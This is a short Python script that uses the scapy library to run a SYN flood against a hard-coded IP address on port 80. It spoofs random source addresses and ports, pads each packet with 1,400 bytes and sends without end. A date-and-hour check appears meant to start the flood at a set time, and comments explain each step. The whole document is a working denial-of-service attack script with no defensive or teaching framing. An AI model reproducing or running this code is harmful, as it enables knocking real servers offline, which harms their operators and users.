import time
from scapy.all import *

localtime = time.asctime( time.localtime(time.time()) )

while localtime[8]+localtime[9]=="09" and localtime[11]+localtime[12]=="18": #runs the script forever localtime8 and 9 is the date, while 11 12 is the hour of the day
    target_ip = "217.63.102.161"
    target_port = 80
    ip = IP(src=RandIP(), dst=target_ip) #sends from a random IP to the target ip of the server
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S") #sends from random port, to the target port of 80, with the SYN flag on
    raw = Raw(b"X" * 1400) #throws in 1400 Bytes of "empty" data
    p = ip / tcp / raw #builds the package
    send(p, loop=1) #sends the package forever (a new is created every time with new src port and IP)


